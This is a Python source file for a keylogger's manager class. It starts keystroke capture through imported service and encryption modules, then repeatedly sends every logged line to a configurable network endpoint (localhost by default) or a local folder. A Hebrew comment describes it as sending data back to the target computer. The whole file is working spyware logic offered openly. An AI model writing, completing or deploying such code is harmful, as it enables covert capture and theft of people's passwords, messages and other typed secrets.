from keylogger_service import KeyloggerService
from network_writer import NetworkWriter
from encryptor import Encryptor
import time

class KeyloggerManager:
    def __init__(self, key="12345", server_url="http://127.0.0.1:8000/log", local_save_dir=None):
        self.encryptor = Encryptor(key)
        self.keylogger = KeyloggerService(self.encryptor)
        self.network = NetworkWriter(server_url, local_save_dir)

    def start(self):
        print("🔴 Keylogger started. Press CTRL+C to stop.")
        self.keylogger.start_logging()
        try:
            while True:
                lines = self.keylogger.get_logged_lines()
                if lines:
                    for line in lines:
                        self.network.write(line)  # שולח ומחזיר למחשב היעד
                    self.keylogger.logged_lines = []
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            lines = self.keylogger.get_logged_lines()
            for line in lines:
                self.network.write(line)
            print("🟢 Keylogger stopped.")
